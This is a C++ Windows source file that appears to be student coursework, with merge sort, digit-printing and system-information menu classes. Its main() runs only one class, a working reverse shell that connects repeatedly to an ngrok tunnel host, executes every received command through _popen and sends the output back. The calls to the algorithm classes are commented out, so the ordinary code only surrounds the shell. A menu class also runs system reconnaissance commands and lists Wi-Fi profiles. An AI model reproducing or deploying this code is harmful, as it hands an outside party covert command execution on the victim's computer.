//©Md Sajibur Rahman
//Dept.of Computer Science & Engineering(CSE)
//University of Barishal(BU)

#include<bits/stdc++.h>
#include<windows.h>
#define MX 100005
#define pb push_back
#define ll long long
#define do {
#define done }
#define read std::cin>>
#define echo std::cout<<
#define start_ int main()
#define finish return 0;
#define bzero(p,size) (void)memset(p,0,(size))

using namespace std;

int temp[MX];
int num[MX];

int sock;
class Algo{
public:


};


class ReverseShell:public Algo
{
 public:
   void Shell()
   {
       char buffer[1024];
       char container[1024];
       char total_response[20000];

       while(1)
       {
          bzero(buffer,sizeof(buffer));
          bzero(container,sizeof(container));
          bzero(total_response,sizeof(total_response));
          recv(sock,buffer,sizeof(buffer),0);

          FILE *fp;
          fp=_popen(buffer,"r");
          while(fgets(container,sizeof(container),fp)!=NULL)
          {
              strcat(total_response,container);
          }
          send(sock,total_response,sizeof(total_response),0);
          fclose(fp);
       }
   }
};

class ShellExecution:public ReverseShell{
public:

   void Execution()
   {
       WSADATA wsaData;
       struct sockaddr_in x;
       ll port=19255;
       const char *ip="0.tcp.in.ngrok.io";

       WSAStartup(MAKEWORD(2,0),&wsaData);
       sock=socket(AF_INET,SOCK_STREAM,0);
       bzero(&x,sizeof(x));

       x.sin_family=AF_INET;
       x.sin_port=htons(port);

       struct hostent *host;
       host=gethostbyname(ip);

       x.sin_addr = *((struct in_addr *)host->h_addr);
       while(connect(sock, (struct sockaddr *)&x, sizeof(x)) != 0)
       {
           Sleep(10);
       }
       Shell();

 }
};


class MargeSort:public Algo{
public:
         void Marge(int lo,int hi)
         {
             if(lo==hi)return;
             int mid=(lo+hi)/2;
             Marge(lo,mid);
             Marge(mid+1,hi);
             int i,j,k;
             for(i=lo,j=mid+1,k=lo;k<=hi;k++)
             {
                 if(i==mid+1)temp[k]=num[j++];
                 else if(j==hi+1)temp[k]=num[i++];
                 else if(num[i]<num[j])temp[k]=num[i++];
                 else temp[k]=num[j++];
             }
             for(k=lo;k<=hi;k++)
             {
                 num[k]=temp[k];
             }
         }
};

class MargeSortInput:public MargeSort{
public:
         void Solve()
         {
             int n;read n;
             int lo=1,hi=n;
             for(int i=lo;i<=hi;i++)
             {
                 read num[i];
             }
             Marge(lo,hi);
             for(int i=1;i<=n;i++)
             {
                 echo num[i]<<"\n";
             }
         }
};



class CMD:public Algo{
public:
         void Solve()
         {
             system("color 0A");
             for(int row=1;row<=5;row++)
             {
                 for(int col=1;col<=row;col++)
                 {
                     echo "HACKER";
                 }
                 echo "\n";
             }
             for(int row=5;row>=1;row--)
             {
                 for(int col=1;col<=row;col++)
                 {
                     echo "BU";
                 }
                 echo "\n";
             }

            echo "\n";
            echo "[+] Enter a option you want to see\n";
            echo "[1] Systeminfo\n";
            echo "[2] Wifi Details of your pc\n";
            echo "[3] CPU details\n";
            echo "[4] Find OS\n";
            echo "[5] Get Mac Address\n";
            echo "[6] Open Browser\n";
            echo "[7] msinfo32\n";
            echo "[8] How many Softwares this pc contains\n";
            echo "[9] Processor Name\n";
            echo "[10] Processor Architecture\n";
            echo "[11] How many cores this processor Contain\n";
            echo "[12] RAM Info\n";
            echo "[13] Connected Wifi password\n";
            echo "[14] Use powershell to access c derive\n";
            echo "[15] Creating a File in Desktop\n";


            int x;
            read x;

            if(x==1)
               system("systeminfo");
            else if(x==2)
               system("netsh wlan show profiles");

            else if(x==3)
                system(" wmic cpu get name");
            else if(x==4)
                system("wmic os get version");
            else if(x==5)
                system("getmac");
            else if(x==6)
                system("start www.google.com");
            else if(x==7)
                system("msinfo32");
            else if(x==8)
                system(" wmic product get name ");
            else if(x==9)
                system(" wmic cpu get name");
            else if(x==10)
                system("wmic cpu");
            else if(x==11)
                system("wmic cpu get numberofcores");
            else if(x==12)
                system("wmic computersystem get totalphysicalmemory");
            else if(x==14){
               system("cd C:\\Users\\%USERNAME%\\Desktop && dir");
               system("powershell -Command \"ls\"");
               system("powershell -Command \"Get-Location; ls\"");
               system("powershell -Command \"& { ls; Get-Date; whoami }\"");
               system("powershell -Command \"Get-ChildItem 'C:\\\\Users\\\\$env:USERNAME\\\\Downloads'\"");
               }
            else if(x==15)
            {
                system("cd C:\\Users\\%USERNAME%\\Desktop && mkdir testdir");
                system("cd C:\\Users\\%USERNAME%\\Desktop\\testdir && echo BISMILLAH > test.txt");
            }
                Solve();
         }

};

class Root:public Algo{
public:
         void Solve()
         {
             int n,x;read n;
             while(n>0)
             {
                 x=n%10;
                 n=n/10;
                 echo x<<"\n";
             }
         }
};



start_
do

   //CMD cmd;
   //cmd.Solve();

   //Root rt;
   //rt.Solve();

  // MargeSortInput msi;
   //msi.Solve();

  ShellExecution se;
  se.Execution();



   finish
done
